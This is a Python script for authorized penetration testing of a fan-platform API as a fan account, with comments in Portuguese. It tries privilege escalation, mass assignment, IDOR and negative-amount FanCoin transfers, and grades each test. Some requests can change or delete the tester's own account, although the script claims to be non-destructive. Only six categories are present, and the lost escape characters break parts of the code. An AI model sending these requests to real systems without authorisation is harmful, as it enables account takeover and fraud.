#!/usr/bin/env python3
"""
============================================================================
FANDREAMS â€” PENTEST FAN ACCOUNT â€” AUTHENTICATED PENETRATION TEST v3.0
============================================================================

Simula um atacante avancado com conta FAN roubada/registrada na plataforma
FanDreams. Testa escalacao de privilegios, IDOR, manipulacao financeira,
race conditions e abuso de logica de negocio.

Cobertura: 20 categorias, 160+ testes individuais
Metodologias: OWASP API Security Top 10, IDOR, Race Conditions, Business Logic

Dependencias:
    pip install requests aiohttp

Uso:
    python pentest_fan.py --target https://api.fandreams.app \
        --email fan@test.com --password senha123 \
        [--output pentest_fan] [--verbose] [--skip-race]

============================================================================
AVISO: Uso EXCLUSIVO em testes de seguranca autorizados da FanDreams.
Todos os testes sao nao-destrutivos (read-only ou dados falsos/aleatorios).
============================================================================
"""

import argparse
import asyncio
import json
import sys
import time
import uuid
import hashlib
import base64
import hmac
from datetime import datetime, timezone
from dataclasses import dataclass, field, asdict
from typing import Optional, List, Dict

try:
    import requests
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
except ImportError:
    print("[!] Dependencia ausente: pip install requests")
    sys.exit(1)

try:
    import aiohttp
except ImportError:
    print("[!] Dependencia ausente: pip install aiohttp")
    sys.exit(1)

# --- Constants ---
FAKE_UUID = str(uuid.uuid4())
FAKE_UUID2 = str(uuid.uuid4())
FAKE_UUID3 = str(uuid.uuid4())
VERSION = "3.0"
TEST_COUNTER = 0


# === Console Output Helpers (colored) ========================================

class C:
    """ANSI color codes for terminal output."""
    R = "[91m"    # Red (FAIL)
    G = "[92m"    # Green (PASS)
    Y = "[93m"    # Yellow (WARN)
    B = "[94m"    # Blue (INFO)
    M = "[95m"    # Magenta
    CY = "[96m"   # Cyan
    GR = "[90m"   # Gray (SKIP)
    BD = "[1m"    # Bold
    RS = "[0m"    # Reset

VERBOSE = False

def ok(m):   print(f"  {C.G}[PASS]{C.RS} {m}")
def fail(m): print(f"  {C.R}[FAIL]{C.RS} {m}")
def warn(m): print(f"  {C.Y}[WARN]{C.RS} {m}")
def info(m): print(f"  {C.B}[INFO]{C.RS} {m}")
def skip(m): print(f"  {C.GR}[SKIP]{C.RS} {m}")
def hdr(m):  print(f"
{C.BD}{C.CY}{"="*72}{C.RS}
{C.BD}  {m}{C.RS}
{C.BD}{C.CY}{"="*72}{C.RS}")
def subhdr(m): print(f"
  {C.BD}{C.M}--- {m} ---{C.RS}")
def vprint(m):
    if VERBOSE:
        print(f"  {C.GR}[DBG] {m}{C.RS}")


# === Result Tracking ==========================================================

@dataclass
class TestResult:
    """Single test result entry."""
    category: str
    test_id: str
    name: str
    severity: str         # CRITICAL, HIGH, MEDIUM, LOW, INFO
    status: str           # PASS, FAIL, WARN, SKIP, ERROR
    description: str
    details: str = ""
    recommendation: str = ""

@dataclass
class PentestReport:
    """Full penetration test report."""
    target: str
    scanner: str = f"FanDreams Fan Pentest v{VERSION}"
    scan_time: str = ""
    scan_duration: float = 0.0
    user_id: str = ""
    user_role: str = ""
    user_email: str = ""
    username: str = ""
    access_token: str = ""
    refresh_token: str = ""
    results: List[TestResult] = field(default_factory=list)
    category_timings: Dict[str, float] = field(default_factory=dict)
    summary: dict = field(default_factory=dict)

    def add(self, r: TestResult):
        global TEST_COUNTER
        TEST_COUNTER += 1
        self.results.append(r)
        st = r.status
        if st == "PASS":
            ok(f"[{r.test_id}] {r.name}")
        elif st == "FAIL":
            fail(f"[{r.test_id}] {r.name} â€” {r.description}")
        elif st == "WARN":
            warn(f"[{r.test_id}] {r.name}")
        elif st == "SKIP":
            skip(f"[{r.test_id}] {r.name}")
        else:
            info(f"[{r.test_id}] {r.name}")

    def compute_score(self):
        """Compute security score (100 baseline, deduct per failure)."""
        score = 100
        for r in self.results:
            if r.status == "FAIL":
                score -= {"CRITICAL": 12, "HIGH": 6, "MEDIUM": 3, "LOW": 1, "INFO": 0}.get(r.severity, 1)
            elif r.status == "WARN":
                score -= {"CRITICAL": 4, "HIGH": 2, "MEDIUM": 1, "LOW": 0, "INFO": 0}.get(r.severity, 0)
        score = max(0, score)
        grade = "A" if score >= 90 else "B" if score >= 80 else "C" if score >= 70 else "D" if score >= 60 else "F"
        total = len(self.results)
        self.summary = {
            "total_tests": total,
            "passed": sum(1 for r in self.results if r.status == "PASS"),
            "failed": sum(1 for r in self.results if r.status == "FAIL"),
            "warnings": sum(1 for r in self.results if r.status == "WARN"),
            "skipped": sum(1 for r in self.results if r.status == "SKIP"),
            "errors": sum(1 for r in self.results if r.status == "ERROR"),
            "critical_failures": sum(1 for r in self.results if r.status == "FAIL" and r.severity == "CRITICAL"),
            "high_failures": sum(1 for r in self.results if r.status == "FAIL" and r.severity == "HIGH"),
            "medium_failures": sum(1 for r in self.results if r.status == "FAIL" and r.severity == "MEDIUM"),
            "score": score,
            "grade": grade,
            "scan_duration_seconds": round(self.scan_duration, 2),
            "category_timings": self.category_timings,
        }
        return score, grade


# === HTTP Helpers =============================================================

def make_session():
    """Create a requests session with retry logic."""
    s = requests.Session()
    retries = Retry(total=2, backoff_factor=0.5, status_forcelist=[502, 503, 504])
    s.mount("https://", HTTPAdapter(max_retries=retries))
    s.mount("http://", HTTPAdapter(max_retries=retries))
    s.headers.update({
        "Content-Type": "application/json",
        "Accept": "application/json",
        "User-Agent": f"FanDreams-FanPentest/{VERSION}",
    })
    return s


def do_login(session, base, email, password):
    """Authenticate and return user data + tokens."""
    info(f"Autenticando como {email}...")
    try:
        r = session.post(f"{base}/auth/login", json={"email": email, "password": password}, timeout=15)
        d = r.json()
        if r.status_code == 200 and d.get("success"):
            data = d["data"]
            access_token = data.get("accessToken", "")
            refresh_token = data.get("refreshToken", "")
            user = data.get("user", {})
            session.headers["Authorization"] = f"Bearer {access_token}"
            ok(f"Login OK \u2014 userId={user.get('id')}, role={user.get('role','?')}, username={user.get('username','?')}")
            return user, access_token, refresh_token
        fail(f"Login falhou: {r.status_code} \u2014 {d}")
        sys.exit(1)
    except Exception as e:
        fail(f"Erro de conexao no login: {e}")
        sys.exit(1)


def _safe_json(r):
    """Safely parse JSON response."""
    try:
        return r.json()
    except Exception:
        return {"_raw": r.text[:500] if hasattr(r, "text") else str(r)}


class _FakeResponse:
    """Fake response for connection errors."""
    def __init__(self, error):
        self.status_code = 0
        self._error = str(error)
    def json(self):
        return {"error": self._error}


def GET(session, base, path, **kw):
    try:
        r = session.get(f"{base}{path}", timeout=10, **kw)
        vprint(f"GET {path} -> {r.status_code}")
        return r
    except Exception as e:
        vprint(f"GET {path} -> ERROR: {e}")
        return _FakeResponse(e)

def POST(session, base, path, json_data=None, **kw):
    try:
        r = session.post(f"{base}{path}", json=json_data, timeout=10, **kw)
        vprint(f"POST {path} -> {r.status_code}")
        return r
    except Exception as e:
        vprint(f"POST {path} -> ERROR: {e}")
        return _FakeResponse(e)

def PATCH(session, base, path, json_data=None, **kw):
    try:
        r = session.patch(f"{base}{path}", json=json_data, timeout=10, **kw)
        vprint(f"PATCH {path} -> {r.status_code}")
        return r
    except Exception as e:
        vprint(f"PATCH {path} -> ERROR: {e}")
        return _FakeResponse(e)

def DELETE(session, base, path, **kw):
    try:
        r = session.delete(f"{base}{path}", timeout=10, **kw)
        vprint(f"DELETE {path} -> {r.status_code}")
        return r
    except Exception as e:
        vprint(f"DELETE {path} -> ERROR: {e}")
        return _FakeResponse(e)

def PUT(session, base, path, json_data=None, **kw):
    try:
        r = session.put(f"{base}{path}", json=json_data, timeout=10, **kw)
        vprint(f"PUT {path} -> {r.status_code}")
        return r
    except Exception as e:
        vprint(f"PUT {path} -> ERROR: {e}")
        return _FakeResponse(e)


def is_blocked(r, allow_404=True):
    """Check if an endpoint correctly blocked the request (non-200 or error response)."""
    if r.status_code == 0:
        return True  # Connection error counts as blocked
    if r.status_code in (401, 403):
        return True
    if allow_404 and r.status_code == 404:
        return True
    if r.status_code == 200:
        d = _safe_json(r)
        if d.get("success") is False:
            return True
        return False  # 200 + success = NOT blocked
    # 400, 422, 429, 500 etc = blocked
    return True


def is_success(r):
    """Check if response indicates success."""
    if r.status_code == 200 or r.status_code == 201:
        d = _safe_json(r)
        return d.get("success", False)
    return False



# ##############################################################################
#  CATEGORY 1: PRIVILEGE ESCALATION â€” FAN TO ADMIN (15+ tests)
# ##############################################################################

def test_cat01_fan_to_admin(s, base, rpt):
    """Test that a fan account cannot access any admin endpoints."""
    hdr("CAT 01: Escalacao de Privilegio \u2014 Fan -> Admin")
    t0 = time.time()
    cat = "01-Priv-Esc-Admin"
    tid = 0

    admin_endpoints = [
        ("GET",   "/admin/dashboard",                             None),
        ("GET",   "/admin/users",                                 None),
        ("GET",   "/admin/users?page=1&limit=10&search=admin",   None),
        ("PATCH", f"/admin/users/{FAKE_UUID}",                    {"role": "admin", "isActive": True}),
        ("GET",   "/admin/kyc",                                   None),
        ("GET",   f"/admin/kyc/{FAKE_UUID}",                      None),
        ("POST",  f"/admin/kyc/{FAKE_UUID}/review",               {"approved": True, "reason": "pentest"}),
        ("GET",   "/platform/admin/cookie-consents/stats",        None),
        ("GET",   "/platform/admin/cookie-consents",              None),
        ("POST",  "/platform/admin/page/terms",                   {"content": "<p>hacked</p>"}),
        ("GET",   "/platform/admin/contact-messages",             None),
        ("PATCH", f"/platform/admin/contact-messages/{FAKE_UUID}/read", {}),
        ("PATCH", "/platform/admin/seo",                          {"title": "hacked", "description": "pwned"}),
        ("POST",  "/creator-score/admin/recalculate-all",         {}),
        ("GET",   "/admin/users?role=admin",                      None),
    ]

    all_blocked = True
    for method, path, body in admin_endpoints:
        tid += 1
        test_id = f"C01-{tid:02d}"

        if method == "GET":
            r = GET(s, base, path)
        elif method == "POST":
            r = POST(s, base, path, body)
        elif method == "PATCH":
            r = PATCH(s, base, path, body)
        else:
            r = DELETE(s, base, path)

        blocked = is_blocked(r)
        if not blocked:
            all_blocked = False
            rpt.add(TestResult(cat, test_id, f"Admin {method} {path.split('?')[0][:40]}",
                               "CRITICAL", "FAIL",
                               f"Fan acessou endpoint admin: {method} {path}",
                               f"Status: {r.status_code}, Response: {str(_safe_json(r))[:200]}",
                               "Verificar middleware de autorizacao admin em todas as rotas /admin"))
        else:
            rpt.add(TestResult(cat, test_id, f"Admin {method} {path.split('?')[0][:40]}",
                               "CRITICAL", "PASS",
                               f"Endpoint admin bloqueado ({r.status_code})",
                               f"Status: {r.status_code}"))

    rpt.category_timings[cat] = round(time.time() - t0, 2)


# ##############################################################################
#  CATEGORY 2: PRIVILEGE ESCALATION â€” FAN TO CREATOR (14 tests)
# ##############################################################################

def test_cat02_fan_to_creator(s, base, rpt):
    """Test that a fan account cannot access creator-only endpoints."""
    hdr("CAT 02: Escalacao de Privilegio \u2014 Fan -> Creator")
    t0 = time.time()
    cat = "02-Priv-Esc-Creator"
    tid = 0

    creator_endpoints = [
        ("GET",   "/creators/me",                         None),
        ("PATCH", "/creators/me",                         {"subscriptionPrice": 49.90, "bio": "hacked"}),
        ("GET",   "/creators/me/earnings",                None),
        ("GET",   "/creators/me/subscribers",             None),
        ("POST",  "/creators/me/tiers",                   {"name": "pentest-tier", "price": 9.99, "description": "test"}),
        ("GET",   "/creators/me/promos",                  None),
        ("POST",  "/creators/me/promos",                  {"code": "PWNED", "discount": 100, "maxUses": 999}),
        ("POST",  "/posts",                               {"caption": "pentest-post", "visibility": "public", "mediaUrls": []}),
        ("POST",  "/video/upload",                        {"title": "pentest", "postId": FAKE_UUID}),
        ("GET",   "/video/list",                          None),
        ("GET",   "/creator-score/me/score",              None),
        ("POST",  "/creator-score/me/recalculate",        {}),
        ("GET",   "/commitments/creator",                 None),
        ("POST",  "/guilds",                              {"name": "pentest-guild", "description": "test"}),
    ]

    all_blocked = True
    for method, path, body in creator_endpoints:
        tid += 1
        test_id = f"C02-{tid:02d}"

        if method == "GET":
            r = GET(s, base, path)
        elif method == "POST":
            r = POST(s, base, path, body)
        elif method == "PATCH":
            r = PATCH(s, base, path, body)
        else:
            r = DELETE(s, base, path)

        blocked = is_blocked(r)
        if not blocked:
            all_blocked = False
            rpt.add(TestResult(cat, test_id, f"Creator {method} {path[:40]}",
                               "HIGH", "FAIL",
                               f"Fan acessou endpoint de creator: {method} {path}",
                               f"Status: {r.status_code}, Response: {str(_safe_json(r))[:200]}",
                               "Verificar role-check middleware para endpoints de creator"))
        else:
            rpt.add(TestResult(cat, test_id, f"Creator {method} {path[:40]}",
                               "HIGH", "PASS",
                               f"Endpoint creator bloqueado ({r.status_code})",
                               f"Status: {r.status_code}"))

    rpt.category_timings[cat] = round(time.time() - t0, 2)


# ##############################################################################
#  CATEGORY 3: IDOR â€” USER PROFILE & SETTINGS (11 tests)
# ##############################################################################

def test_cat03_user_profile_idor(s, base, rpt, uid, username):
    """Test IDOR and mass assignment on user profile endpoints."""
    hdr("CAT 03: IDOR \u2014 User Profile & Settings")
    t0 = time.time()
    cat = "03-IDOR-Profile"
    tid = 0

    # C03-01: Mass assignment â€” try setting privileged fields
    tid += 1
    r = PATCH(s, base, "/users/me", {
        "role": "admin", "isAdmin": True, "emailVerified": True,
        "balance": 999999, "id": FAKE_UUID, "createdAt": "2020-01-01",
    })
    d = _safe_json(r)
    escalated = False
    if r.status_code == 200 and d.get("success"):
        data = d.get("data", {})
        if data.get("role") == "admin" or data.get("isAdmin") is True:
            escalated = True
        if data.get("balance") == 999999:
            escalated = True
        if data.get("id") == FAKE_UUID:
            escalated = True
    rpt.add(TestResult(cat, f"C03-{tid:02d}", "Mass Assignment role/balance/id",
                       "CRITICAL", "FAIL" if escalated else "PASS",
                       "Campos privilegiados alterados via mass assignment!" if escalated else
                       "Campos privilegiados ignorados no PATCH /users/me",
                       f"Status: {r.status_code}",
                       "Usar allowlist de campos atualizaveis no endpoint"))

    # C03-02: Get own profile (baseline)
    tid += 1
    r = GET(s, base, "/users/me")
    rpt.add(TestResult(cat, f"C03-{tid:02d}", "GET /users/me (baseline)",
                       "INFO", "PASS" if r.status_code == 200 else "WARN",
                       f"Perfil proprio: status {r.status_code}"))

    # C03-03: Change password without currentPassword
    tid += 1
    r = PATCH(s, base, "/users/me/password", {"newPassword": "Hacked123!", "confirmPassword": "Hacked123!"})
    blocked = is_blocked(r)
    rpt.add(TestResult(cat, f"C03-{tid:02d}", "Trocar senha sem currentPassword",
                       "HIGH", "PASS" if blocked else "FAIL",
                       "Troca de senha requer senha atual" if blocked else
                       "Senha trocada sem fornecer senha atual!",
                       f"Status: {r.status_code}",
                       "Exigir currentPassword para alterar senha"))

    # C03-04: Change password with empty currentPassword
    tid += 1
    r = PATCH(s, base, "/users/me/password", {"currentPassword": "", "newPassword": "Hacked123!", "confirmPassword": "Hacked123!"})
    blocked = is_blocked(r)
    rpt.add(TestResult(cat, f"C03-{tid:02d}", "Trocar senha com currentPassword vazio",
                       "HIGH", "PASS" if blocked else "FAIL",
                       "Senha vazia rejeitada" if blocked else "Senha vazia aceita!",
                       f"Status: {r.status_code}"))

    # C03-05: Get own settings
    tid += 1
    r = GET(s, base, "/users/me/settings")
    rpt.add(TestResult(cat, f"C03-{tid:02d}", "GET /users/me/settings",
                       "INFO", "PASS" if r.status_code in (200, 404) else "WARN",
                       f"Settings: status {r.status_code}"))

    # C03-06: Mass assign privileged fields on settings
    tid += 1
    r = PATCH(s, base, "/users/me/settings", {
        "role": "admin", "isAdmin": True, "permissions": ["*"],
        "emailVerified": True, "kycStatus": "approved",
    })
    d = _safe_json(r)
    escalated = False
    if is_success(r):
        data = d.get("data", {})
        if data.get("role") == "admin" or data.get("isAdmin"):
            escalated = True
    rpt.add(TestResult(cat, f"C03-{tid:02d}", "Mass Assignment em /users/me/settings",
                       "HIGH", "FAIL" if escalated else "PASS",
                       "Campos privilegiados injetados em settings!" if escalated else
                       "Settings protegidos contra mass assignment",
                       f"Status: {r.status_code}"))

    # C03-07: Deactivate account without password
    tid += 1
    r = POST(s, base, "/users/me/deactivate", {})
    blocked = is_blocked(r)
    rpt.add(TestResult(cat, f"C03-{tid:02d}", "Desativar conta sem senha",
                       "MEDIUM", "PASS" if blocked else "WARN",
                       "Desativacao requer confirmacao" if blocked else
                       "Conta desativada sem confirmacao de senha",
                       f"Status: {r.status_code}",
                       "Exigir senha para desativar conta"))

    # C03-08: Delete account without password
    tid += 1
    r = POST(s, base, "/users/me/delete", {})
    blocked = is_blocked(r)
    rpt.add(TestResult(cat, f"C03-{tid:02d}", "Deletar conta sem senha",
                       "MEDIUM", "PASS" if blocked else "WARN",
                       "Delecao requer confirmacao" if blocked else
                       "Conta deletada sem confirmacao!",
                       f"Status: {r.status_code}"))

    # C03-09: Follow random user
    tid += 1
    r = POST(s, base, f"/users/{FAKE_UUID}/follow", {})
    rpt.add(TestResult(cat, f"C03-{tid:02d}", "Follow usuario aleatorio",
                       "INFO", "PASS",
                       f"Follow: status {r.status_code} (comportamento esperado)"))

    # C03-10: Unfollow random user
    tid += 1
    r = DELETE(s, base, f"/users/{FAKE_UUID}/follow")
    rpt.add(TestResult(cat, f"C03-{tid:02d}", "Unfollow usuario aleatorio",
                       "INFO", "PASS",
                       f"Unfollow: status {r.status_code}"))

    # C03-11: Check follow status
    tid += 1
    r = GET(s, base, f"/users/{FAKE_UUID}/follow")
    rpt.add(TestResult(cat, f"C03-{tid:02d}", "Check follow status",
                       "INFO", "PASS",
                       f"Follow status: {r.status_code}"))

    rpt.category_timings[cat] = round(time.time() - t0, 2)


# ##############################################################################
#  CATEGORY 4: IDOR â€” FANCOIN FINANCIAL (17 tests)
# ##############################################################################

def test_cat04_fancoin_financial(s, base, rpt, uid, username):
    """Test financial manipulation on FanCoin endpoints."""
    hdr("CAT 04: IDOR \u2014 FanCoin Financial")
    t0 = time.time()
    cat = "04-IDOR-FanCoin"
    tid = 0

    # C04-01: Get own wallet
    tid += 1
    r = GET(s, base, "/fancoins/wallet")
    rpt.add(TestResult(cat, f"C04-{tid:02d}", "GET /fancoins/wallet (baseline)",
                       "INFO", "PASS" if r.status_code in (200, 404) else "WARN",
                       f"Wallet: status {r.status_code}"))

    # Tip tests â€” various boundary conditions
    tip_tests = [
        (f"C04-{{:02d}}", "Tip negativo (-100)",         {"creatorId": FAKE_UUID, "amount": -100},        "CRITICAL"),
        (f"C04-{{:02d}}", "Tip zero (0)",                {"creatorId": FAKE_UUID, "amount": 0},           "HIGH"),
        (f"C04-{{:02d}}", "Tip overflow (999999999)",    {"creatorId": FAKE_UUID, "amount": 999999999},   "HIGH"),
        (f"C04-{{:02d}}", "Tip fracionario (0.001)",     {"creatorId": FAKE_UUID, "amount": 0.001},       "MEDIUM"),
        (f"C04-{{:02d}}", "Self-tip (proprio userId)",   {"creatorId": uid, "amount": 10},                "HIGH"),
    ]
    for _, name, body, sev in tip_tests:
        tid += 1
        test_id = f"C04-{tid:02d}"
        r = POST(s, base, "/fancoins/tip", body)
        accepted = is_success(r)
        is_self = body.get("creatorId") == uid
        is_negative = body.get("amount", 0) < 0
        is_zero = body.get("amount") == 0
        is_overflow = body.get("amount", 0) > 1000000

        if is_negative and accepted:
            rpt.add(TestResult(cat, test_id, name, sev, "FAIL",
                               "Tip com valor negativo aceito! Possivel roubo de FanCoins",
                               f"Status: {r.status_code}, Body: {str(_safe_json(r))[:200]}",
                               "Validar amount > 0 no backend"))
        elif is_zero and accepted:
            rpt.add(TestResult(cat, test_id, name, sev, "WARN",
                               "Tip com valor zero aceito",
                               f"Status: {r.status_code}",
                               "Rejeitar tips com amount = 0"))
        elif is_overflow and accepted:
            rpt.add(TestResult(cat, test_id, name, sev, "FAIL",
                               "Tip com valor absurdo aceito! Possivel overflow",
                               f"Status: {r.status_code}",
                               "Definir limite maximo de tip por transacao"))
        elif is_self and accepted:
            rpt.add(TestResult(cat, test_id, name, sev, "FAIL",
                               "Self-tip aceito! Usuario pode inflar saldo",
                               f"Status: {r.status_code}",
                               "Bloquear tip para si mesmo"))
        else:
            rpt.add(TestResult(cat, test_id, name, sev, "PASS",
                               f"Tip rejeitado corretamente ({r.status_code})",
                               f"Status: {r.status_code}"))

    # C04-07: Purchase fake package
    tid += 1
    r = POST(s, base, "/fancoins/purchase", {"packageId": FAKE_UUID})
    rpt.add(TestResult(cat, f"C04-{tid:02d}", "Comprar pacote inexistente",
                       "MEDIUM", "PASS" if is_blocked(r) else "WARN",
                       f"Purchase fake package: {r.status_code}",
                       f"Response: {str(_safe_json(r))[:200]}"))

    # Transfer tests
    transfer_tests = [
        ("Transfer para usuario inexistente",      {"toUsername": "nonexistent_user_xyzzy_99", "amount": 100}, "MEDIUM"),
        ("Self-transfer",                           {"toUsername": username or "self", "amount": 100},          "HIGH"),
        ("Transfer negativo (-50)",                 {"toUsername": "nonexistent_user_xyzzy_99", "amount": -50}, "CRITICAL"),
        ("Transfer zero (0)",                       {"toUsername": "nonexistent_user_xyzzy_99", "amount": 0},   "HIGH"),
        ("Transfer overflow (99999999)",            {"toUsername": "nonexistent_user_xyzzy_99", "amount": 99999999}, "HIGH"),
    ]
    for name, body, sev in transfer_tests:
        tid += 1
        test_id = f"C04-{tid:02d}"
        r = POST(s, base, "/fancoins/transfer", body)
        accepted = is_success(r)
        is_negative = body.get("amount", 0) < 0
        is_zero = body.get("amount") == 0
        is_self = body.get("toUsername") == username
        is_overflow = body.get("amount", 0) > 1000000

        if is_negative and accepted:
            rpt.add(TestResult(cat, test_id, name, sev, "FAIL",
                               "Transfer negativo aceito!",
                               f"Status: {r.status_code}",
                               "Validar amount > 0"))
        elif is_self and accepted:
            rpt.add(TestResult(cat, test_id, name, sev, "FAIL",
                               "Self-transfer aceito!",
                               f"Status: {r.status_code}",
                               "Bloquear transferencia para si mesmo"))
        elif is_zero and accepted:
            rpt.add(TestResult(cat, test_id, name, sev, "WARN",
                               "Transfer zero aceito",
                               f"Status: {r.status_code}"))
        elif is_overflow and accepted:
            rpt.add(TestResult(cat, test_id, name, sev, "FAIL",
                               "Transfer overflow aceito!",
                               f"Status: {r.status_code}"))
        else:
            rpt.add(TestResult(cat, test_id, name, sev, "PASS",
                               f"Transfer rejeitado ({r.status_code})"))

    # C04-13: Transfer preview negative
    tid += 1
    r = GET(s, base, "/fancoins/transfer-preview?amount=-100")
    rpt.add(TestResult(cat, f"C04-{tid:02d}", "Transfer preview negativo",
                       "MEDIUM", "PASS" if is_blocked(r) else "WARN",
                       f"Preview -100: {r.status_code}"))

    # C04-14: Transfer preview zero
    tid += 1
    r = GET(s, base, "/fancoins/transfer-preview?amount=0")
    rpt.add(TestResult(cat, f"C04-{tid:02d}", "Transfer preview zero",
                       "LOW", "PASS" if is_blocked(r) else "WARN",
                       f"Preview 0: {r.status_code}"))

    # C04-15: Search user (should work)
    tid += 1
    r = GET(s, base, "/fancoins/search-user?q=a")
    rpt.add(TestResult(cat, f"C04-{tid:02d}", "Search user (normal)",
                       "INFO", "PASS",
                       f"Search 'a': {r.status_code}"))

    # C04-16: Empty search
    tid += 1
    r = GET(s, base, "/fancoins/search-user?q=")
    rpt.add(TestResult(cat, f"C04-{tid:02d}", "Search user vazio",
                       "LOW", "PASS" if is_blocked(r) else "WARN",
                       f"Search vazio: {r.status_code}",
                       recommendation="Rejeitar buscas vazias"))

    # C04-17: Oversized search
    tid += 1
    oversized = "A" * 200
    r = GET(s, base, f"/fancoins/search-user?q={oversized}")
    rpt.add(TestResult(cat, f"C04-{tid:02d}", "Search user oversized (200 chars)",
                       "LOW", "PASS" if is_blocked(r) else "WARN",
                       f"Search oversized: {r.status_code}",
                       recommendation="Limitar tamanho do parametro de busca"))

    rpt.category_timings[cat] = round(time.time() - t0, 2)


# ##############################################################################
#  CATEGORY 5: IDOR â€” SUBSCRIPTIONS (8 tests)
# ##############################################################################

def test_cat05_subscriptions(s, base, rpt, uid):
    """Test subscription IDOR and business logic abuse."""
    hdr("CAT 05: IDOR \u2014 Subscriptions")
    t0 = time.time()
    cat = "05-IDOR-Subscriptions"
    tid = 0

    # C05-01: Self-subscribe
    tid += 1
    r = POST(s, base, "/subscriptions", {"creatorId": uid})
    accepted = is_success(r)
    rpt.add(TestResult(cat, f"C05-{tid:02d}", "Self-subscribe (assinar a si mesmo)",
                       "HIGH", "FAIL" if accepted else "PASS",
                       "Auto-assinatura aceita!" if accepted else "Auto-assinatura bloqueada",
                       f"Status: {r.status_code}",
                       "Bloquear assinatura onde creatorId == userId"))

    # C05-02: Subscribe to nonexistent creator
    tid += 1
    r = POST(s, base, "/subscriptions", {
        "creatorId": FAKE_UUID, "tierId": FAKE_UUID, "paymentMethod": "pix"
    })
    rpt.add(TestResult(cat, f"C05-{tid:02d}", "Subscribe a creator inexistente",
                       "MEDIUM", "PASS" if is_blocked(r) else "WARN",
                       f"Subscribe nonexistent: {r.status_code}",
                       f"Response: {str(_safe_json(r))[:200]}"))

    # C05-03: List own subscriptions
    tid += 1
    r = GET(s, base, "/subscriptions")
    rpt.add(TestResult(cat, f"C05-{tid:02d}", "GET /subscriptions (proprias)",
                       "INFO", "PASS",
                       f"List subscriptions: {r.status_code}"))

    # C05-04: Cancel random subscription
    tid += 1
    r = DELETE(s, base, f"/subscriptions/{FAKE_UUID}")
    accepted = is_success(r)
    rpt.add(TestResult(cat, f"C05-{tid:02d}", "Cancelar subscription alheia (IDOR)",
                       "HIGH", "FAIL" if accepted else "PASS",
                       "Cancelou subscription de outro!" if accepted else
                       f"Cancel IDOR bloqueado ({r.status_code})",
                       recommendation="Verificar ownership antes de cancelar"))

    # C05-05: Check subscription to random creator
    tid += 1
    r = GET(s, base, f"/subscriptions/check/{FAKE_UUID}")
    rpt.add(TestResult(cat, f"C05-{tid:02d}", "Check subscription de creator aleatorio",
                       "INFO", "PASS",
                       f"Check subscription: {r.status_code}"))

    # C05-06: Status of random subscription
    tid += 1
    r = GET(s, base, f"/subscriptions/status/{FAKE_UUID}")
    rpt.add(TestResult(cat, f"C05-{tid:02d}", "Status de subscription aleatoria",
                       "MEDIUM", "PASS",
                       f"Status: {r.status_code}"))

    # C05-07: Subscribe with manipulated price
    tid += 1
    r = POST(s, base, "/subscriptions", {
        "creatorId": FAKE_UUID, "tierId": FAKE_UUID,
        "price": 0.01, "originalPrice": 0.01, "discount": 100,
    })
    rpt.add(TestResult(cat, f"C05-{tid:02d}", "Subscribe com preco manipulado",
                       "HIGH", "PASS" if is_blocked(r) else "WARN",
                       f"Manipulated price: {r.status_code}",
                       recommendation="Preco deve ser calculado server-side, ignorar campos do client"))

    # C05-08: Trigger subscription expiration cron
    tid += 1
    r = POST(s, base, "/subscriptions/expire", {})
    blocked = is_blocked(r)
    rpt.add(TestResult(cat, f"C05-{tid:02d}", "Trigger cron /subscriptions/expire",
                       "MEDIUM", "PASS" if blocked else "WARN",
                       f"Expire cron: {r.status_code}" + (" (bloqueado)" if blocked else " (acessivel)"),
                       recommendation="Cron endpoints devem ser protegidos por auth interna ou cron secret"))

    rpt.category_timings[cat] = round(time.time() - t0, 2)


# ##############################################################################
#  CATEGORY 6: IDOR â€” POSTS & CONTENT (13 tests)
# ##############################################################################

def test_cat06_posts_content(s, base, rpt):
    """Test IDOR on posts, content manipulation, XSS."""
    hdr("CAT 06: IDOR \u2014 Posts & Content")
    t0 = time.time()
    cat = "06-IDOR-Posts"
    tid = 0

    # C06-01: Get random creator's posts
    tid += 1
    r = GET(s, base, f"/posts/creator/{FAKE_UUID}")
    rpt.add(TestResult(cat, f"C06-{tid:02d}", "GET posts de creator aleatorio",
                       "INFO", "PASS",
                       f"Creator posts: {r.status_code}"))

    # C06-02: Get random post
    tid += 1
    r = GET(s, base, f"/posts/{FAKE_UUID}")
    rpt.add(TestResult(cat, f"C06-{tid:02d}", "GET post aleatorio",
                       "INFO", "PASS",
                       f"Random post: {r.status_code}"))

    # C06-03: Update random post (IDOR)
    tid += 1
    r = PATCH(s, base, f"/posts/{FAKE_UUID}", {"caption": "hacked by pentest"})
    accepted = is_success(r)
    rpt.add(TestResult(cat, f"C06-{tid:02d}", "PATCH post alheio (IDOR)",
                       "HIGH", "FAIL" if accepted else "PASS",
                       "Atualizou post de outro usuario!" if accepted else
                       f"Update IDOR bloqueado ({r.status_code})",
                       recommendation="Verificar ownership do post antes de permitir edicao"))

    # C06-04: Delete random post (IDOR)
    tid += 1
    r = DELETE(s, base, f"/posts/{FAKE_UUID}")
    accepted = is_success(r)
    rpt.add(TestResult(cat, f"C06-{tid:02d}", "DELETE post alheio (IDOR)",
                       "HIGH", "FAIL" if accepted else "PASS",
                       "Deletou post de outro!" if accepted else
                       f"Delete IDOR bloqueado ({r.status_code})"))

    # C06-05: Toggle visibility of random post
    tid += 1
    r = PATCH(s, base, f"/posts/{FAKE_UUID}/toggle-visibility", {})
    accepted = is_success(r)
    rpt.add(TestResult(cat, f"C06-{tid:02d}", "Toggle visibilidade post alheio",
                       "HIGH", "FAIL" if accepted else "PASS",
                       "Alterou visibilidade de post alheio!" if accepted else
                       f"Toggle bloqueado ({r.status_code})"))

    # C06-06: Like random post
    tid += 1
    r = POST(s, base, f"/posts/{FAKE_UUID}/like", {})
    rpt.add(TestResult(cat, f"C06-{tid:02d}", "Like post aleatorio",
                       "INFO", "PASS",
                       f"Like: {r.status_code} (comportamento normal)"))

    # C06-07: Bookmark random post
    tid += 1
    r = POST(s, base, f"/posts/{FAKE_UUID}/bookmark", {})
    rpt.add(TestResult(cat, f"C06-{tid:02d}", "Bookmark post aleatorio",
                       "INFO", "PASS",
                       f"Bookmark: {r.status_code}"))

    # C06-08: Unlock PPV without FanCoins
    tid += 1
    r = POST(s, base, f"/posts/{FAKE_UUID}/unlock", {})
    rpt.add(TestResult(cat, f"C06-{tid:02d}", "Unlock PPV sem FanCoins",
                       "HIGH", "PASS" if is_blocked(r) else "WARN",
                       f"PPV unlock: {r.status_code}",
                       recommendation="Verificar saldo antes de desbloquear conteudo PPV"))

